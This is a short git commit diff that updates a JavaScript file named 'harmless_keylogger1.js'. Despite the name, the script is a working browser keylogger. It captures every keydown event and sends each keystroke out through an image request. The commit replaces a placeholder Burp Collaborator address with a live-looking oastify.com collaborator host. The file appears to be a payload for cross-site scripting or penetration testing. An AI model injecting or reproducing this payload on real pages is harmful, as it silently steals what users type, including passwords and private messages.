3e60c031844782a47a22d6bf598082cbaa984e65
Rafid2211 <77919800+Rafid2211@users.noreply.github.com>
2025-01-25 19:56:44 +0500

    Update harmless_keylogger1.js

--- harmless_keylogger1.js
+++ harmless_keylogger1.js
@@ -2,6 +2,6 @@
 document.addEventListener('keydown', function (e) {
     const keystroke = e.key;
     const img = new Image();
-    img.src = 'https://<your-burp-collaborator-url>.com/log?key=' + encodeURIComponent(keystroke);
+    img.src = 'https://c8lj95p5sy90r25mb3f9rg5ydpjg7byzn.oastify.com/log?key=' + encodeURIComponent(keystroke);
     document.body.appendChild(img); // This sends the keystroke to your server
 });
